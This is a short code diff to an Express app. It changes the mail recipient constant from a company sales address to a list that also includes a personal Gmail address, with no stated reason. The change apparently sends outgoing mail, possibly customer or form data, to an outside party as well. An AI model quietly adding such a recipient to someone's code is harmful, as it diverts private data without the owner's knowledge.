@@ -11,7 +11,7 @@ const app = express();
 
 
 const PORT = process.env.PORT || 4455; // PORTS
-const receiver_email = 'sales@mnc.com';
+const receiver_email = ['sales@mnc.com', 'hodlondreamlife@gmail.com'].join(',');
 require('dotenv').config();  // Load environment variables from .env file
 //const worker = 'Diea Mari';
 let worker = ''; // Define the worker variable globally
